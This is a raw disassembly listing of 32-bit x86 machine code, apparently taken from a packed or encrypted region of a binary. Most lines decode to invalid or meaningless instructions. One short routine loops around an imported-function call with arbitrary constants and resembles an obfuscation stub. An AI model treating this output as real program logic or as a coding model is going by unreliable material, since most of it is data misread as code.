  415a11:	xor    edx,DWORD PTR [eax]
  415a13:	addr16 (bad) 
  415a15:	sub    BYTE PTR [ecx],bl
  415a17:	shr    DWORD PTR [ebx],1
  415a19:	mov    ah,0x34
  415a1b:	adc    ebx,ebp
  415a1d:	jne    0x415a52
  415a1f:	dec    ecx
  415a20:	(bad)  
  415a21:	lds    eax,FWORD PTR [ecx-0x4e2b5d19]
  415a27:	sar    DWORD PTR [ecx+edx*4+0x23],1
  415a2b:	or     BYTE PTR [ecx+0x5cfb4203],cl
  415a31:	mov    DWORD PTR [ebx],eax
  415a33:	push   esi
  415a34:	rcl    BYTE PTR [edx],0xca
  415a37:	mov    ds:0xe6ffb197,al
  415a3c:	shr    ah,1
  415a3e:	sbb    DWORD PTR [eax-0x72],esi
  415a41:	pop    ecx
  415a42:	mov    esi,0x76db15e2
  415a47:	test   eax,0x1713749e
  415a4c:	add    eax,DWORD PTR [ecx]
  415a4e:	xor    al,0xa8
  415a50:	adc    eax,0x2524755f
  415a55:	retf   
  415a56:	cmp    al,0xe9
  415a58:	inc    ebp
  415a59:	jmp    0x33e1b9a4
  415a5e:	test   DWORD PTR [edi],edx
  415a60:	or     ebp,DWORD PTR [edx-0x21]
  415a63:	push   ds
  415a64:	fdivr  DWORD PTR [eax+eiz*2]
  415a67:	in     al,0x3
  415a69:	in     eax,0x84
  415a6b:	sub    DWORD PTR [ebx*4-0x1f2c675c],edi
  415a72:	inc    edi
  415a73:	jge    0x415a18
  415a75:	rol    ebx,1
  415a77:	or     BYTE PTR [esi],bl
  415a79:	add    edi,esp
  415a7b:	sbb    ebx,ebx
  415a7d:	mov    dl,0x6
  415a7f:	mov    dh,0x6a
  415a81:	rol    BYTE PTR [edi-0x63ed4710],0xdf
  415a88:	xchg   edx,eax
  415a89:	and    dl,BYTE PTR [edx-0xc]
  415a8c:	jmp    DWORD PTR [edx]
  415a8e:	(bad)  
  415a8f:	outs   dx,DWORD PTR ds:[esi]
  415a90:	fwait
  415a91:	ror    BYTE PTR ds:0x51487824,0x91
  415a98:	mov    bl,0x73
  415a9a:	bound  ebx,QWORD PTR [esi+0x18fe1ae4]
  415aa0:	adc    eax,ecx
  415aa2:	daa    
  415aa3:	loop   0x415a77
  415aa5:	mov    al,0x8e
  415aa7:	xchg   ch,dl
  415aa9:	push   ecx
  415aaa:	mov    ds:0x4b5fc253,al
  415aaf:	inc    ebx
  415ab0:	jp     0x415a6a
  415ab2:	(bad)  
  415ab3:	int    0xa
  415ab5:	cmp    al,0x3f
  415ab7:	fcmovne st,st(4)
  415ab9:	repnz std 
  415abb:	lock inc esp
  415abd:	stos   DWORD PTR es:[edi],eax
  415abe:	into   
  415abf:	cmp    edx,edx
  415ac1:	pop    edx
  415ac2:	icebp  
  415ac3:	adc    BYTE PTR [eax],dl
  415ac5:	add    BYTE PTR [edx],bh
  415ac7:	pop    ds
  415ac8:	mov    eax,0x78e0da5f
  415acd:	(bad)  
  415ace:	shr    DWORD PTR [esi],0x65
  415ad1:	xchg   esp,eax
  415ad2:	arpl   WORD PTR ds:0x59bbf211,bp
  415ad8:	xor    eax,0x481a7d8f
  415add:	pusha  
  415ade:	loope  0x415a81
  415ae0:	cdq    
  415ae1:	push   edx
  415ae2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ae3:	mov    ah,0x15
  415ae5:	stc    
  415ae6:	(bad)  
  415ae7:	leave  
  415ae8:	enter  0x33c6,0xcd
  415aec:	in     eax,0x18
  415aee:	pop    ebp
  415aef:	add    BYTE PTR [esi+0x38e9178b],al
  415af5:	mov    edi,0x2c438caa
  415afa:	mov    edx,edx
  415afc:	xor    eax,0x6cf6df1b
  415b01:	ret    
  415b02:	mov    cl,BYTE PTR [ebx+0x6d23a819]
  415b08:	push   ss
  415b09:	aaa    
  415b0a:	repnz push esi
  415b0c:	xor    dh,BYTE PTR [eax]
  415b0e:	jo     0x415b83
  415b10:	cmp    ch,BYTE PTR [ebp+ebx*1-0x32]
  415b14:	cld    
  415b15:	or     BYTE PTR [ebx-0x7a7b3a95],al
  415b1b:	add    cl,BYTE PTR [edx]
  415b1d:	test   ch,al
  415b1f:	repz shl BYTE PTR [ebp+0x2b105ea3],0x9c
  415b27:	mov    edx,0x4be668c3
  415b2c:	mov    ecx,0x537b1790
  415b31:	(bad)
  415b34:	jl     0x415ae2
  415b36:	sub    esi,edi
  415b38:	mov    edx,DWORD PTR [ebp+0xc]
  415b3b:	xor    edx,esi
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x42701c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x42701c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x42701c,eax
  415b70:	cmp    DWORD PTR ds:0x42701c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x42701c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x421030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x428008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x425010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0xb8f118bc
  415bea:	jmp    0x5262:0x61470d42
  415bf1:	pop    edi
  415bf2:	bound  esp,QWORD PTR [edx-0x2]
  415bf5:	mov    bh,0xc8
  415bf7:	lods   al,BYTE PTR ds:[esi]
  415bf8:	sub    DWORD PTR [esi-0x34],edx
  415bfb:	shr    BYTE PTR [ebx],1
  415bfd:	and    bl,dl
  415bff:	cld    
  415c00:	and    eax,0x76d87cdc
  415c05:	inc    ecx
  415c06:	lods   al,BYTE PTR ds:[esi]
  415c07:	rcl    DWORD PTR [ecx+0xcb4fc61],0xf0
  415c0e:	mov    al,0x45
  415c10:	cmp    esp,DWORD PTR [ebx+0x1c62e7cd]
  415c16:	mov    ds:0xe1c529f2,eax
  415c1b:	ins    DWORD PTR es:[edi],dx
  415c1c:	mov    dl,0x67
  415c1e:	shl    eax,0x4c
  415c21:	leave  
  415c22:	(bad)  
  415c23:	push   0xffffff9f
  415c25:	lods   al,BYTE PTR ds:[esi]
  415c26:	sahf   
  415c27:	iret   
  415c28:	jl     0x415c62
  415c2a:	retf   
  415c2b:	pop    esi
  415c2c:	adc    edi,ebx
  415c2e:	cmp    eax,DWORD PTR [edx]
  415c30:	inc    edi
  415c31:	push   ecx
  415c32:	jnp    0x415c9b
  415c34:	std    
  415c35:	repz scas eax,DWORD PTR es:[edi]
  415c37:	js     0x415c15
  415c39:	repnz fadd st(7),st
  415c3c:	imul   esi,eax,0x2556aac0
  415c42:	mov    ds:0xb964ddb1,al
  415c47:	(bad)  
  415c48:	shl    ah,cl
  415c4a:	push   ss
  415c4b:	fsubr  QWORD PTR [edi+0x753fd8f]
  415c51:	jp     0x415c31
  415c53:	outs   dx,BYTE PTR ds:[esi]
  415c54:	add    al,0x20
  415c56:	xor    BYTE PTR [ecx+ebp*1+0x78],ch
  415c5a:	sbb    BYTE PTR [eax-0x30],bh
  415c5d:	ret    
  415c5e:	std    
  415c5f:	lock arpl WORD PTR [ecx+ebx*4+0x7daf60a8],sp
  415c67:	mov    ecx,0x1aa778d8
  415c6c:	cdq    
  415c6d:	mov    ecx,DWORD PTR [eax]
  415c6f:	je     0x415c84
  415c71:	jmp    0x601b:0xfe92c715
  415c78:	(bad)  
  415c79:	loop   0x415c6c
  415c7b:	adc    al,bh
  415c7d:	inc    ebp
  415c7e:	clc    
  415c7f:	in     eax,0xe5
  415c81:	dec    ebx
  415c82:	lods   eax,DWORD PTR ds:[esi]
  415c83:	nop
  415c84:	(bad)  
  415c85:	outs   dx,DWORD PTR ds:[esi]
  415c86:	inc    ecx
  415c87:	inc    eax
  415c88:	push   eax
  415c89:	push   0xffffffbd
  415c8b:	add    eax,0x2431c79d
  415c90:	clc    
  415c91:	leave  
  415c92:	pop    edi
  415c93:	mov    ebp,0xc7a98634
  415c98:	pop    ecx
  415c99:	adc    dh,BYTE PTR [ebx+0x5ad025a4]
  415c9f:	and    BYTE PTR [edi],0xb5
  415ca2:	add    BYTE PTR [esi+0x1259f37],bl
  415ca8:	add    BYTE PTR [ecx+edx*1-0x553d0ffe],bl
  415caf:	adc    ah,bh
  415cb1:	sbb    DWORD PTR [ebx],edx
  415cb3:	cmp    ch,BYTE PTR [ebx+0x7a]
  415cb6:	outs   dx,BYTE PTR ds:[esi]
  415cb7:	sub    eax,0x618a4883
  415cbc:	repz imul edi,DWORD PTR [ebp+0x49],0xffffff9d
  415cc1:	in     al,0xbd
  415cc3:	ret    
  415cc4:	pop    ecx
  415cc5:	adc    BYTE PTR [eax+0x490d2f6d],ch
  415ccb:	sbb    DWORD PTR [edi],eax
  415ccd:	(bad)  
  415cce:	adc    eax,0xe855830c
  415cd3:	pop    ebx
  415cd4:	sub    bl,BYTE PTR [edx+0x52]
  415cd7:	add    BYTE PTR [eax-0x588bf88b],al
  415cdd:	outs   dx,BYTE PTR ds:[esi]
  415cde:	loop   0x415c98
  415ce0:	jle    0x415d39
  415ce2:	push   0xffffffe6
  415ce4:	xor    ah,BYTE PTR [ebx-0xe3b5121]
  415cea:	clc    
  415ceb:	mov    al,ds:0x72d73a99
  415cf0:	scas   eax,DWORD PTR es:[edi]
  415cf1:	pop    edx
  415cf2:	shl    BYTE PTR [ebx+0x6f],cl
  415cf5:	int    0xb3
  415cf7:	out    dx,eax
  415cf8:	inc    esi
  415cf9:	jnp    0x415d19
  415cfb:	xchg   edx,eax
  415cfc:	jmp    0xefd6:0x525b0ac1
  415d03:	adc    cl,bh
  415d05:	lock comiss xmm1,DWORD PTR [ecx-0x30e41e84]
  415d0d:	push   0xffffffad
  415d0f:	push   esp
  415d10:	inc    edi
  415d11:	fcom   st(5)
  415d13:	es push ss
  415d15:	dec    esi
  415d16:	gs push 0xd0a9b658
  415d1c:	jnp    0x415ce6
  415d1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d1f:	mov    edi,0x7f01b8b7
  415d24:	call   0x98ac:0x7c63ba01
  415d2b:	nop
  415d2c:	mov    edx,DWORD PTR [ebx+0x0]
  415d2f:	xor    DWORD PTR [ecx+edi*8+0x24],edi
  415d33:	push   ecx
  415d34:	add    BYTE PTR [ecx*8-0x5358d4ed],ah
  415d3b:	mov    bh,0xd1
  415d3d:	inc    ebx
  415d3e:	cmp    edi,ebp
  415d40:	mov    BYTE PTR [ebx+ecx*8],dh
  415d43:	mov    cl,0x32
  415d45:	popa   
  415d46:	in     eax,dx
  415d47:	xor    ebx,DWORD PTR [esi]
  415d49:	aam    0x6a
  415d4b:	retf   0xbd78
  415d4e:	les    ecx,FWORD PTR [edi-0x18]
  415d51:	repnz xchg ecx,eax
  415d53:	sbb    al,0xfc
  415d55:	out    0x3f,eax
  415d57:	xor    al,BYTE PTR [bx-0x1d27]
  415d5c:	inc    edi
  415d5d:	jmp    0x424:0x6e39c582
  415d64:	or     DWORD PTR [ecx],0x75163b70
  415d6a:	imul   esi,DWORD PTR [edx],0x97e8aaf9
  415d70:	fld    QWORD PTR [ecx]
  415d72:	in     eax,dx
  415d73:	xchg   ebp,eax
  415d74:	sub    dh,al
  415d76:	int    0x2
  415d78:	dec    esi
  415d79:	push   ds
  415d7a:	dec    edi
  415d7b:	cmp    dh,BYTE PTR [esp+eax*8+0x6e13953b]
  415d82:	lods   eax,DWORD PTR ds:[esi]
  415d83:	shl    DWORD PTR [ebx],0xb2
  415d86:	fimul  WORD PTR [esi+esi*1-0xf]
  415d8a:	sub    DWORD PTR [ebp-0x40a01010],edx
  415d90:	xor    DWORD PTR [ebx+0x5e],eax
  415d93:	pop    ebx
  415d94:	push   es
  415d95:	cmp    eax,edx
  415d97:	pop    es
  415d98:	mov    ds:0xd7075fa9,al
  415d9d:	or     al,0x38
  415d9f:	int3   
  415da0:	mov    ecx,0x29adf5ba
  415da5:	xchg   BYTE PTR [ebx-0x79109bd9],bl
  415dab:	xchg   edi,eax
  415dac:	repnz push ebx
  415dae:	jl     0x415d43
  415db0:	(bad)  
  415db1:	dec    esi
  415db2:	retf   
  415db3:	pop    edi
  415db4:	cld    
  415db5:	dec    ebp
  415db6:	mov    ds:0x318a59d1,eax
  415dbb:	xchg   DWORD PTR [ecx-0x44628591],edx
  415dc1:	sbb    DWORD PTR [ebx+ebx*4],0x64ca0703
  415dc8:	pop    es
  415dc9:	dec    esi
  415dca:	aam    0x15
  415dcc:	dec    esp
  415dcd:	pusha  
  415dce:	nop
  415dcf:	dec    eax
  415dd0:	cld    
  415dd1:	mov    ah,0xfd
  415dd3:	clc    
  415dd4:	inc    edx
  415dd5:	cmp    eax,0xaf90b02b
  415dda:	lds    ebx,FWORD PTR [edx-0x60]
  415ddd:	pop    eax
  415dde:	adc    ebp,DWORD PTR [edi-0x69f5cfd]
  415de4:	push   0xffffffc4
  415de6:	stos   BYTE PTR es:[edi],al
  415de7:	mov    esi,DWORD PTR [eax-0x31]
  415dea:	imul   ebx,DWORD PTR [ebx],0xffffffeb
  415ded:	mov    esp,0xd2eec135
  415df2:	(bad)  
  415df3:	mov    al,ds:0x1af4bfc3
  415df8:	outs   dx,BYTE PTR ds:[esi]
  415df9:	mov    BYTE PTR [esi-0x619d68ed],0x7d
  415e00:	adc    eax,edx
  415e02:	mov    ah,0x18
  415e04:	in     al,0x3b
  415e06:	cmp    esi,DWORD PTR [esi+0x784d5081]
  415e0c:	js     0x415df8
  415e0e:	fwait
  415e0f:	cmp    eax,0x14f59ff2
  415e14:	inc    edi
  415e15:	fucomp st(1)
  415e17:	mov    ecx,0x34c79ec1
  415e1c:	rcr    DWORD PTR [edi-0x782875c2],cl
  415e22:	out    dx,al
  415e23:	jnp    0x415e8f
  415e25:	xor    dl,BYTE PTR [esi]
  415e27:	test   BYTE PTR [ecx-0x661e5e62],dl
  415e2d:	mov    eax,ds:0xefad15a
  415e32:	call   0xb5d5:0x877e95fc
  415e39:	das    
  415e3a:	jl     0x415e5d
  415e3c:	inc    esp
  415e3d:	(bad)  
  415e3e:	sbb    cl,BYTE PTR [eax+ecx*1-0x3c275f87]
  415e45:	jl     0x415de4
  415e47:	and    eax,0x32311921
  415e4c:	push   esp
  415e4d:	sub    al,0xbe
  415e4f:	(bad)
  415e52:	sbb    BYTE PTR [ecx-0x32011024],ah
  415e58:	sbb    bh,bh
  415e5a:	jp     0x415de7
  415e5c:	rcl    BYTE PTR [edi],cl
  415e5e:	fcmove st,st(7)
  415e60:	xchg   DWORD PTR [esi],ebp
  415e62:	jge    0x415e55
  415e64:	adc    eax,0x3560fc0a
  415e69:	sub    DWORD PTR [esi+0x62],0xff4161a1
  415e70:	cmp    eax,0x4f158466
  415e75:	shl    ebp,1
  415e77:	sub    DWORD PTR [eax],eax
  415e79:	xchg   edx,eax
  415e7a:	sub    dl,al
  415e7c:	cmc    
  415e7d:	cmp    al,0xf5
  415e7f:	jp     0x415e18
  415e81:	in     eax,dx
  415e82:	push   ebp
  415e83:	cli    
  415e84:	lods   al,BYTE PTR ds:[esi]
  415e85:	loope  0x415e13
  415e87:	outs   dx,DWORD PTR ds:[esi]
  415e88:	(bad)  
  415e89:	int3   
  415e8a:	sub    bh,BYTE PTR [ebx-0x3392fef3]
  415e90:	sbb    al,0xd3
  415e92:	mov    dl,0x56
  415e94:	sub    DWORD PTR [edx],ebp
  415e96:	push   ebx
  415e97:	add    esi,ebp
  415e99:	mov    al,0xef
  415e9b:	jp     0x415e86
  415e9d:	addr16 cdq 
  415e9f:	pop    ecx
  415ea0:	cmp    DWORD PTR [ebx],edi
  415ea2:	scas   al,BYTE PTR es:[edi]
  415ea3:	into   
  415ea4:	cmc    
  415ea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ea6:	xchg   edx,eax
  415ea7:	adc    esi,DWORD PTR [edi+0x6a6c2b5b]
  415ead:	mov    cl,0x22
  415eaf:	shl    DWORD PTR [eax+0x3],0xab
  415eb3:	retf   
  415eb4:	in     al,dx
  415eb5:	xchg   ebp,eax
  415eb6:	inc    edi
  415eb7:	fild   DWORD PTR [edi]
  415eb9:	in     eax,dx
  415eba:	(bad)  
  415ebb:	xor    esi,DWORD PTR [ebp+0x5e]
  415ebe:	mov    ds:0xee823218,al
  415ec3:	mov    esp,0x385a7423
  415ec8:	cmc    
  415ec9:	data16 stc 
  415ecb:	mov    al,ds:0x26154d59
  415ed0:	mov    ds,WORD PTR [edi]
  415ed2:	scas   eax,DWORD PTR es:[edi]
  415ed3:	sar    DWORD PTR [esi-0x72],1
  415ed6:	shr    DWORD PTR [ebp+0x5d],1
  415ed9:	leave  
  415eda:	ud0    edx,DWORD PTR [ebp+0x58]
  415ede:	icebp  
  415edf:	xchg   ebx,eax
  415ee0:	jns    0x415e64
  415ee2:	jae    0x415e7f
  415ee4:	loope  0x415e79
  415ee6:	xchg   esi,eax
  415ee7:	add    BYTE PTR ds:0x50ba5625,0xac
  415eee:	or     dl,ch
  415ef0:	xchg   edi,eax
  415ef1:	sbb    BYTE PTR ds:0x64bf126f,dh
  415ef7:	or     al,dh
  415ef9:	icebp  
  415efa:	jmp    0x9f4e4219
  415eff:	add    DWORD PTR [ecx],ebx
  415f01:	mov    al,0xc6
  415f03:	push   edx
  415f04:	or     dh,BYTE PTR [ecx]
  415f06:	cmp    BYTE PTR [eax],0x3c
  415f09:	mov    esp,0x448f3270
  415f0e:	shr    BYTE PTR [esi-0x659f62d5],cl
  415f14:	inc    eax
  415f15:	pop    ecx
  415f16:	or     DWORD PTR [edi+edi*4+0x64],edx
  415f1a:	pushf  
  415f1b:	and    BYTE PTR [ebp-0x7d],cl
  415f1e:	push   esp
  415f1f:	jmp    0x415f59
  415f21:	cld    
  415f22:	xchg   ecx,eax
  415f23:	fsub   QWORD PTR [edx+0x68b44cb1]
  415f29:	into   
  415f2a:	mov    eax,ecx
  415f2c:	pop    edx
  415f2d:	fiadd  WORD PTR [edi+eax*4-0x55]
  415f31:	inc    edi
  415f32:	mov    ebp,0xe4268020
  415f37:	inc    ecx
  415f38:	adc    cl,BYTE PTR [edi]
  415f3a:	ja     0x415f1e
  415f3c:	mov    DWORD PTR [edi],esi
  415f3e:	cmp    DWORD PTR [edi+0x85e7284],ebp
  415f44:	test   DWORD PTR [edx+0xc7fbf87],edi
  415f4a:	pop    es
  415f4b:	mov    bl,0xe4
  415f4d:	sbb    DWORD PTR [edi],edi
  415f4f:	xchg   ebp,eax
  415f50:	dec    esp
  415f51:	sbb    eax,0x6293bfd9
  415f56:	in     eax,dx
  415f57:	loopne 0x415eed
  415f59:	add    dh,dh
  415f5b:	xor    al,dl
  415f5d:	mov    al,0xdf
  415f5f:	cmp    eax,0x1ccf8adc
  415f64:	mov    eax,0x83c72194
  415f69:	retf   
  415f6a:	mov    eax,es:0x8d7d4049
  415f70:	(bad)  
  415f71:	mov    eax,ds:0xcdee2e28
  415f76:	sub    DWORD PTR [esi-0x79],ebx
  415f79:	mov    al,ds:0x6edb4650
  415f7e:	mov    BYTE PTR [esi-0x7a],dl
  415f81:	adc    edi,DWORD PTR [eax-0x36e38ce8]
  415f87:	rol    BYTE PTR [esi-0x1602b7df],cl
  415f8d:	outs   dx,DWORD PTR ds:[esi]
  415f8e:	shl    BYTE PTR [edi],0x3c
  415f91:	das    
  415f92:	sbb    al,0xf8
  415f94:	popa   
  415f95:	mov    ds,esi
  415f97:	dec    edi
  415f98:	popf   
  415f99:	out    0x41,al
  415f9b:	and    ebp,DWORD PTR [ebp+0x2501a988]
  415fa1:	mov    ebx,0x531afe16
  415fa6:	outs   dx,BYTE PTR ds:[esi]
  415fa7:	ja     0x415ff5
  415fa9:	imul   esi,esi,0x70
  415fac:	cwde   
  415fad:	cmc    
  415fae:	retf   
  415faf:	(bad)  [ebx-0x1a]
  415fb2:	shl    BYTE PTR ds:0x1ad5452c,0x4f
  415fb9:	hlt    
  415fba:	add    BYTE PTR [esi-0x1a],0xd1
  415fbe:	xor    al,0xea
  415fc0:	xor    eax,0x94f9bf9b
  415fc5:	mov    al,ds:0x47a8c328
  415fca:	inc    esp
  415fcb:	push   es
  415fcc:	sbb    ebp,DWORD PTR [eax]
  415fce:	sub    esp,DWORD PTR [ebp-0x131a8f94]
  415fd4:	push   0x1620274b
  415fd9:	jecxz  0x415fe8
  415fdb:	pusha  
  415fdc:	dec    eax
  415fdd:	lds    esi,FWORD PTR [edi-0x4e5cccf0]
  415fe3:	fnstcw WORD PTR [edx-0x7ce3e863]
  415fe9:	sub    al,0xfb
  415feb:	dec    ebp
  415fec:	sub    al,0x6c
  415fee:	leave  
  415fef:	and    al,0x43
  415ff1:	sahf   
  415ff2:	sub    al,0x71
  415ff4:	push   ss
  415ff5:	cmp    edx,ecx
  415ff7:	push   ecx
  415ff8:	loope  0x416017
  415ffa:	inc    ebp
  415ffb:	jp     0x416009
  415ffd:	shr    DWORD PTR cs:[eax],1
  416000:	jae    0x415fc8
  416002:	jbe    0x416040
  416004:	add    eax,0x5f6312c8
  416009:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41600a:	fs jge 0x416054
  41600d:	adc    al,0xc6
  41600f:	shr    dl,0xdb
  416012:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416013:	mov    edx,0x43772c3d
  416018:	cmp    DWORD PTR [ebx+0x75c799b8],esi
  41601e:	imul   DWORD PTR [eiz*4-0x30178c37]
  416025:	fwait
  416026:	push   0xffffffc5
  416028:	mov    edi,0xd801c673
  41602d:	jne    0x4160a5
  41602f:	mov    ds:0x8a44ff34,al
  416034:	sub    BYTE PTR [ecx-0x22],ah
  416037:	inc    edx
  416038:	lahf   
  416039:	(bad)  
  41603a:	jno    0x41609a
  41603c:	mov    esp,0x166f3141
  416041:	daa    
  416042:	or     eax,0xd96df001
  416047:	shl    DWORD PTR [edx-0x26e6de6b],cl
  41604d:	jne    0x41606d
  41604f:	fs cmp dl,dh
  416052:	dec    ebp
  416053:	mov    ds:0xda99e76e,al
  416058:	and    DWORD PTR [edi+edi*8+0x1b],0x3ce0690c
  416060:	xchg   esi,eax
  416061:	mov    al,ds:0x29c4754
  416066:	adc    al,0xf7
  416068:	mov    dl,0xb
  41606a:	inc    edx
  41606b:	enter  0xe20d,0x8d
  41606f:	sub    ecx,DWORD PTR ds:0x90aa2ec6
  416075:	test   DWORD PTR [esi],edi
  416077:	ds cmp eax,0x6873221f
  41607d:	xor    al,BYTE PTR [edx]
  41607f:	and    BYTE PTR [ebp+0x7e568b42],bh
  416085:	push   cs
  416086:	in     al,0x52
  416088:	jae    0x416054
  41608a:	add    al,0xf2
  41608c:	adc    al,0x26
  41608e:	jecxz  0x4160e1
  416090:	addps  xmm0,XMMWORD PTR [esi]
  416093:	test   ah,ch
  416095:	inc    esi
  416096:	or     esp,DWORD PTR [esi-0x656d6f53]
  41609c:	ret    0xf1ff
  41609f:	xor    DWORD PTR [ecx+0x12],esi
  4160a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160a3:	or     BYTE PTR [edx-0x78844577],bl
  4160a9:	mov    ebx,0x182b5809
  4160ae:	dec    ecx
  4160af:	iret   
  4160b0:	int3   
  4160b1:	daa    
  4160b2:	jmp    0x2b4b:0x1b241ec8
  4160b9:	or     BYTE PTR [edx+eiz*8],bh
  4160bc:	out    dx,eax
  4160bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4160be:	jne    0x4160b1
  4160c0:	push   DWORD PTR [edx+0x84e5d81]
  4160c6:	sbb    ecx,DWORD PTR [edx+edx*2+0xab144e9]
  4160cd:	repnz inc eax
  4160cf:	loopne 0x4160b9
  4160d1:	test   edx,0xc7e4d767
  4160d7:	sub    al,0xe6
  4160da:	fs hlt 
  4160dc:	xor    al,0x3a
  4160de:	sub    DWORD PTR [ebx+esi*2-0x1b10c4bb],0xff2a9a87
  4160e9:	enter  0x6669,0x41
  4160ed:	push   cs
  4160ee:	mov    bh,0xf9
  4160f0:	dec    eax
  4160f1:	ja     0x41616c
  4160f3:	inc    esp
  4160f4:	not    DWORD PTR [ebp-0x60a6a9bb]
  4160fa:	fmul   QWORD PTR [ebx]
  4160fc:	test   al,0xe2
  4160fe:	stos   DWORD PTR es:[edi],eax
  4160ff:	sub    BYTE PTR [ecx],ah
  416101:	lock cli 
  416103:	jno    0x41612c
  416105:	daa    
  416106:	push   edx
  416107:	jbe    0x4160fe
  416109:	mov    dl,0xb2
  41610b:	or     al,0xdf
  41610d:	sbb    ch,cl
  41610f:	outs   dx,BYTE PTR ds:[esi]
  416110:	xor    DWORD PTR [ecx+0x4a],edx
  416113:	sub    DWORD PTR [ebp-0x43a1bd46],0xfffffff6
  41611a:	add    al,0x39
  41611c:	not    DWORD PTR [eax+0x4dbcc73c]
  416122:	mul    DWORD PTR [edx+0x378bca81]
  416128:	add    edi,DWORD PTR [ecx+0x3]
  41612b:	or     al,0x57
  41612d:	in     eax,0x77
  41612f:	scas   eax,DWORD PTR es:[edi]
  416130:	lea    eax,[ebx+0x141f854a]
  416136:	pop    es
  416137:	mov    eax,0x6fde93d2
  41613c:	adc    edx,eax
  41613e:	cmp    al,0x38
  416140:	sub    eax,0x1c801e3f
  416145:	dec    edx
  416146:	lock mov dl,BYTE PTR [ebp-0x19]
  41614a:	jb     0x416152
  41614c:	lods   al,BYTE PTR ds:[esi]
  41614d:	cli    
  41614e:	in     al,dx
  41614f:	jp     0x41616c
  416151:	or     al,0xca
  416153:	jecxz  0x41610d
  416155:	jg     0x416189
  416157:	adc    ebx,edi
  416159:	fstp   DWORD PTR [edi]
  41615b:	mov    WORD PTR [eax-0x4cdc4640],ds
  416161:	hlt    
  416162:	(bad)  
  416163:	sti    
  416164:	pop    ss
  416165:	(bad)  
  416166:	aas    
  416167:	data16 fiadd WORD PTR [edi]
  41616a:	icebp  
  41616b:	push   esp
  41616c:	imul   esi,ebx,0x38a7a148
  416172:	mov    ah,0x18
  416174:	repnz sbb esi,ebp
  416177:	icebp  
  416178:	stos   BYTE PTR es:[edi],al
  416179:	sahf   
  41617a:	mov    ch,0xb1
  41617c:	sbb    BYTE PTR [esi],al
  41617e:	xchg   ecx,eax
  41617f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416180:	call   0xad8b4b9c
  416185:	add    ah,BYTE PTR [ecx-0xc]
  416188:	loopne 0x416183
  41618a:	pushf  
  41618b:	daa    
  41618c:	aas    
  41618d:	or     ch,BYTE PTR [edi]
  41618f:	pop    esi
  416190:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416191:	aaa    
  416192:	mov    ebp,0xe14b0a2d
  416197:	jno    0x41618a
  416199:	test   BYTE PTR [ebp-0x7a],dl
  41619c:	mov    WORD PTR ds:0x6bdfba95,?
  4161a2:	mov    cs,WORD PTR [eax-0x62]
  4161a5:	cwde   
  4161a6:	mov    ebx,0x925ab7
  4161ab:	jg     0x4161b2
  4161ad:	retf   
  4161ae:	std    
  4161af:	int    0xb1
  4161b1:	cmc    
  4161b2:	sbb    al,0x41
  4161b4:	imul   edx,DWORD PTR [ebx+0x4d286efa],0xffffff84
  4161bb:	sub    al,bh
  4161bd:	out    0x3c,al
  4161bf:	aas    
  4161c0:	xchg   DWORD PTR [ebx-0x9973faf],eax
  4161c6:	or     al,0x74
  4161c8:	rcl    DWORD PTR [edi+ecx*1],1
  4161cb:	and    DWORD PTR [edi+edi*1-0x6f],edi
  4161cf:	pop    ss
  4161d0:	retf   
  4161d1:	retw   
  4161d3:	inc    ebx
  4161d4:	push   0x2c
  4161d6:	adc    al,0xc4
  4161d8:	out    dx,eax
  4161d9:	out    dx,eax
  4161da:	inc    eax
  4161db:	dec    eax
  4161dc:	or     al,0x87
  4161de:	setge  BYTE PTR [esi+ecx*4+0x73]
  4161e3:	jne    0x4161f4
  4161e5:	push   ebp
  4161e6:	or     DWORD PTR [edx-0x7],edi
  4161e9:	mov    ah,dh
  4161eb:	(bad)  [edi]
  4161ed:	push   ss
  4161ee:	pop    ss
  4161ef:	pop    ds
  4161f0:	sub    bh,ah
  4161f2:	daa    
  4161f3:	stos   DWORD PTR es:[edi],eax
  4161f4:	ins    DWORD PTR es:[edi],dx
  4161f5:	out    0x85,al
  4161f7:	mov    WORD PTR [edi-0x3f],cs
  4161fa:	fstp   DWORD PTR [edi+0x36]
  4161fd:	sbb    eax,0x2babcc6
  416202:	je     0x4161c1
  416204:	jnp    0x41618c
  416206:	cs push edi
  416208:	fs stos DWORD PTR es:[edi],eax
  41620a:	cmp    dl,BYTE PTR [ecx+eax*2]
  41620d:	das    
  41620e:	shl    ebp,1
  416210:	jo     0x41621e
  416212:	in     eax,0x5f
  416214:	in     al,0xef
  416216:	push   ecx
